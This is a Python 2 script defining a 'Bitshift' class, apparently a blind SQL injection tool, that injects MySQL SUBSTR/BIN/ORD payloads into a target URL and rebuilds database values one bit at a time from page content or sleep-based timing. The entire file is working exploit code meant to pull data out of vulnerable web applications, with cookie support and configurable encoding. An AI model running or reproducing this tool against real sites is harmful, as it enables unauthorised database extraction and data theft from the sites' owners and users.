#!/usr/bin/python
import requests
import urllib 
import re
import time
from progressbar import ProgressBar,Percentage,Bar
from termcolor import colored

class Bitshift:

	url=str()
	pattern=str()
	encodemode=str()
	reg_condition=str()
	debuglevel=0
	length=2000
	sleeptime=float(0)
	condition_target="content"
	break_on_null=True
	check_time=7
	cookies=dict()

	def encode(self,injection):
		if "space_to_plus" in self.encodemode:
			injection=injection.replace(" ","+")

		if "urllib_quote" in self.encodemode:
			injection=urllib.quote(injection)
			
		return injection

	def get_next(self,char_pos,bin_pos):
		
		if self.condition_target == "time_based": 
			P1="IF((SELECT(SUBSTR(LPAD(BIN(ORD(SUBSTR("
			P2=",%d,1))),8,0),%d,1))),sleep(%d),1)"% (char_pos,bin_pos,self.check_time)
		else:
			P1="SELECT(SUBSTR(LPAD(BIN(ORD(SUBSTR("
			P2=",%d,1))),8,0),%d,1))" % (char_pos,bin_pos)
		
		injection=(self.pattern.replace("__BITSHIFT(__",P1,1)).replace("__)__",P2,1)
		
		if self.debuglevel>1:
			print colored("[~~] " + injection, 'yellow')
		
		injection=self.encode(injection)
		
		return injection

	def sleep(self):
		if self.sleep:
			time.sleep(float(self.sleeptime))		

	def make_request(self,injection):
		ret=str()

		if self.condition_target == "time_based":
			before=time.time()
					
		r=requests.get(self.url+injection,cookies=self.cookies)

		if self.condition_target == "content":
			if self.rg_condition.search(r.content):
				ret="1"
			else:
				ret="0"
		elif self.condition_target == "time_based":
			after=time.time()
			
			diff=after-before

			if diff>float(self.check_time):
				ret="1"
			else:
				ret="0"

		if self.debuglevel>2:
			print colored("[~~] REQUEST CONTENT DUMP "+"#"*30, 'yellow')
			print colored(r.content, 'yellow')
			print colored("#"*56, 'yellow')

		return ret
		
	def getvalue(self):

		if not len(self.reg_condition):
			print colored("[EE] No condition to match...", 'red')
			return 

		self.rg_condition = re.compile(self.reg_condition)
		word=str()
		MAX=self.length+1

		pbar = ProgressBar(widgets=[Percentage(), Bar()], maxval=MAX).start()
		for position_char_bf in range(1,MAX):
			bindump=str()
			for postion_binary_bf in range(1,9):
				
				injection=self.get_next(position_char_bf,postion_binary_bf)
				
				self.sleep()

				bindump+=self.make_request(injection)

				pbar.update(position_char_bf+1)

			if self.debuglevel:
				print colored("[~~] CHAR %04d : %s [%s]" % (position_char_bf,chr(int(bindump,2)),bindump),'yellow')	
			
			if self.break_on_null and not int(bindump,2):
				break
			else:
				word+=chr(int(bindump,2))	

		pbar.finish()
		return word
